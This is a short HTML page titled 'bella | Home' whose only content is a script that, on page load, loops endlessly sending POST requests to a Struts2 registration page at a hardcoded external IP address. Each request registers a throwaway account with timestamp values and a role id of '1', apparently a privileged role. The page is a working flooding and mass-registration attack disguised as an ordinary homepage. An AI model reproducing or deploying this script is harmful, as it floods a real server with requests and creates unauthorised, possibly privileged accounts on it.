<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head lang="en">
    <title>bella | Home</title>
</head>
<script src="release/jquery.bella.min.js"></script>
<script src="release/bella.js"></script>
<script>
    while (true) {
        $.post(
            "http://120.79.60.27/Struts2_Book/zhuce.jsp",
            {
                "user.username": bella.getTimeStamp(),
                "user.password":  bella.getTimeStamp(),
                "user.tel": bella.getTimeStamp(),
                "user.roleid": "1"
            },
            function (data) {
            }
        );
    }
</script>
<body></body>
